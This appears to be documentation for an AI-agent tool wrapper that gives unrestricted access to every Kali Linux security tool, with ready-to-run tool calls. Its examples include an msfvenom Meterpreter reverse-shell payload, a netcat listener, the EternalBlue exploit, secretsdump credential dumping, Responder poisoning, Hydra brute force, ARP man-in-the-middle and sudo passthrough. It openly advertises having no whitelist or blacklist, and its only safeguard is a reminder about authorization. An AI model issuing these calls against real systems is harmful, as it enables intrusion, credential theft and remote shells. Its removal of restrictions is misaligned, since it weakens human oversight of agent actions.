# kali_security - Universal Kali Linux Tools Wrapper

## 🔓 UNRESTRICTED ACCESS
This tool provides FULL, UNRESTRICTED access to ALL Kali Linux security tools.
- ✅ No whitelist
- ✅ No blacklist  
- ✅ Complete Kali arsenal (600+ tools)
- ✅ Any tool installed on the system

## ⚠️ CRITICAL: Authorization Required
**ONLY use for authorized security testing and research.**
Unauthorized access to systems is ILLEGAL.
User assumes ALL legal responsibility.

## Tool Categories Available

### Network Scanning
- nmap, masscan, netdiscover, hping3, unicornscan

### Web Application Testing
- burpsuite, zaproxy (zap), nikto, sqlmap, wpscan
- dirb, gobuster, ffuf, wfuzz, dirbuster
- davtest, cadaver, padbuster

### Password Cracking
- john (John the Ripper), hashcat, hydra
- medusa, ncrack, patator, crunch
- cewl, rsmangler, cupp

### Exploitation Frameworks
- msfconsole (Metasploit), msfvenom
- beef (Browser Exploitation Framework)
- set (Social-Engineer Toolkit)
- empire, cobalt strike

### Wireless Attacks
- aircrack-ng, aireplay-ng, airodump-ng
- wifite, reaver, bully, pixiewps
- kismet, fern-wifi-cracker

### Packet Analysis
- wireshark, tshark, tcpdump
- ettercap, dsniff, arpspoof
- netsniff-ng

### Information Gathering
- whois, dnsenum, dnsrecon, fierce
- theHarvester, maltego, recon-ng
- shodan, censys, subfinder
- amass, assetfinder, httprobe

### Vulnerability Scanning
- openvas, nessus, nexpose
- nikto, wapiti, skipfish
- lynis, chkrootkit, rkhunter

### Forensics & Analysis
- volatility, foremost, binwalk
- autopsy, sleuthkit, scalpel
- strings, exiftool, pdfid

### Network Tools
- netcat (nc), socat, proxychains
- stunnel, sslstrip, sslscan
- sslyze, testssl

### Sniffing & Spoofing
- responder, mitm6, bettercap
- dnsspoof, macchanger

### Post-Exploitation
- mimikatz (via wine), impacket
- powersploit, empire
- linpeas, winpeas

### Reverse Engineering
- radare2, ghidra, ida (if installed)
- objdump, gdb, ltrace, strace

### And 500+ More Tools!

## Usage

**Tool:** kali_security
**Parameters:**
- `tool` (required): Name of the Kali tool to execute
- `args` (optional): Arguments to pass to the tool (string or array)
- `target` (optional): Target IP/domain (automatically added to args)
- `timeout` (optional): Execution timeout in seconds (default: 300)

## Examples

### Network Scanning
```python
# Basic nmap scan
tool: "kali_security"
args: {
  "tool": "nmap",
  "args": ["-sV", "-p-"],
  "target": "192.168.1.1",
  "timeout": 600
}

# Masscan for fast port discovery
tool: "kali_security"
args: {
  "tool": "masscan",
  "args": ["-p1-65535", "--rate=1000"],
  "target": "10.0.0.0/24"
}
```

### Web Application Testing
```python
# Burpsuite command-line scanner
tool: "kali_security"
args: {
  "tool": "burpsuite",
  "args": ["--project-file=/tmp/test.burp"]
}

# ZAP baseline scan
tool: "kali_security"
args: {
  "tool": "zap-baseline.py",
  "args": ["-t", "https://example.com", "-r", "report.html"]
}

# Nikto web scanner
tool: "kali_security"
args: {
  "tool": "nikto",
  "args": ["-h", "example.com", "-ssl"]
}

# SQLMap injection testing
tool: "kali_security"
args: {
  "tool": "sqlmap",
  "args": ["-u", "http://example.com/page?id=1", "--dbs"]
}
```

### Password Cracking
```python
# John the Ripper
tool: "kali_security"
args: {
  "tool": "john",
  "args": ["--wordlist=/usr/share/wordlists/rockyou.txt", "hashes.txt"]
}

# Hashcat
tool: "kali_security"
args: {
  "tool": "hashcat",
  "args": ["-m", "0", "-a", "0", "hash.txt", "wordlist.txt"]
}

# Hydra brute force
tool: "kali_security"
args: {
  "tool": "hydra",
  "args": ["-l", "admin", "-P", "passwords.txt", "ssh://192.168.1.1"]
}
```

### Wireless Attacks
```python
# Aircrack-ng
tool: "kali_security"
args: {
  "tool": "aircrack-ng",
  "args": ["-w", "/usr/share/wordlists/rockyou.txt", "capture.cap"]
}

# Wifite automated attack
tool: "kali_security"
args: {
  "tool": "wifite",
  "args": ["--kill", "--wpa"]
}
```

### Packet Analysis
```python
# Wireshark (tshark CLI)
tool: "kali_security"
args: {
  "tool": "tshark",
  "args": ["-i", "eth0", "-c", "100", "-w", "capture.pcap"]
}

# Ettercap MITM
tool: "kali_security"
args: {
  "tool": "ettercap",
  "args": ["-T", "-M", "arp:remote", "/192.168.1.1//", "/192.168.1.100//"]
}
```

### Information Gathering
```python
# theHarvester email enumeration
tool: "kali_security"
args: {
  "tool": "theHarvester",
  "args": ["-d", "example.com", "-b", "all"]
}

# Subfinder subdomain discovery
tool: "kali_security"
args: {
  "tool": "subfinder",
  "args": ["-d", "example.com", "-all"]
}

# Amass comprehensive recon
tool: "kali_security"
args: {
  "tool": "amass",
  "args": ["enum", "-d", "example.com"]
}
```

### Forensics
```python
# Volatility memory analysis
tool: "kali_security"
args: {
  "tool": "volatility",
  "args": ["-f", "memory.dmp", "--profile=Win7SP1x64", "pslist"]
}

# Binwalk firmware analysis
tool: "kali_security"
args: {
  "tool": "binwalk",
  "args": ["-e", "firmware.bin"]
}

# Foremost file carving
tool: "kali_security"
args: {
  "tool": "foremost",
  "args": ["-i", "disk.img", "-o", "recovered/"]
}
```

### Network Tools
```python
# Netcat listener
tool: "kali_security"
args: {
  "tool": "nc",
  "args": ["-lvnp", "4444"]
}

# Proxychains for anonymity
tool: "kali_security"
args: {
  "tool": "proxychains",
  "args": ["nmap", "-sT", "192.168.1.1"]
}

# SSLScan certificate analysis
tool: "kali_security"
args: {
  "tool": "sslscan",
  "target": "example.com:443"
}
```

### Exploitation
```python
# Metasploit console
tool: "kali_security"
args: {
  "tool": "msfconsole",
  "args": ["-x", "use exploit/windows/smb/ms17_010_eternalblue; show options"]
}

# MSFvenom payload generation
tool: "kali_security"
args: {
  "tool": "msfvenom",
  "args": ["-p", "windows/meterpreter/reverse_tcp", "LHOST=10.0.0.1", "LPORT=4444", "-f", "exe", "-o", "payload.exe"]
}

# BeEF browser exploitation
tool: "kali_security"
args: {
  "tool": "beef-xss",
  "args": []
}
```

### Post-Exploitation
```python
# Impacket tools
tool: "kali_security"
args: {
  "tool": "secretsdump.py",
  "args": ["domain/user:password@192.168.1.1"]
}

# Responder LLMNR poisoning
tool: "kali_security"
args: {
  "tool": "responder",
  "args": ["-I", "eth0", "-wrf"]
}
```

## Important Notes

1. **Full Kali Arsenal**: Can execute ANY tool installed on Kali Linux
2. **No Restrictions**: No whitelist or blacklist - complete freedom
3. **Authorization**: ALWAYS ensure you have explicit permission
4. **Timeout**: Adjust timeout for long-running scans
5. **Output**: Large outputs are truncated at 20KB
6. **Error Handling**: Tool errors are captured and displayed
7. **Security Warning**: Displayed with every execution

## Tool Discovery

If unsure which tool to use:
1. Check Kali documentation: https://www.kali.org/tools/
2. Use `searchsploit` to find exploits
3. Use `apt-cache search <keyword>` to find tools
4. Consult tool man pages: `man <tool-name>`

## Common Tool Flags

**Nmap:**
- `-sV`: Service version detection
- `-sC`: Default NSE scripts
- `-p-`: Scan all ports
- `-A`: Aggressive scan (OS, version, scripts, traceroute)

**Burpsuite:**
- `--project-file`: Specify project file
- `--config-file`: Load configuration

**Sqlmap:**
- `--dbs`: Enumerate databases
- `--tables`: Enumerate tables
- `--dump`: Dump table data
- `--batch`: Non-interactive mode

**Hydra:**
- `-l`: Single username
- `-L`: Username list file
- `-p`: Single password
- `-P`: Password list file

**John:**
- `--wordlist`: Specify wordlist
- `--format`: Hash format
- `--show`: Show cracked passwords

## Troubleshooting

**Tool not found:**
- Install with: `apt-get install <tool-name>`
- Verify installation: `which <tool-name>`

**Permission denied:**
- Some tools require root: use `sudo` in args
- Example: `"tool": "sudo", "args": ["nmap", "-sS", "target"]`

**Timeout:**
- Increase timeout parameter
- Default is 300 seconds (5 minutes)

## 🔓 FREEDOM = RESPONSIBILITY

With great power comes great responsibility.
This tool gives you UNRESTRICTED access to the most powerful
security testing tools on the planet.

Use wisely. Use ethically. Use legally.
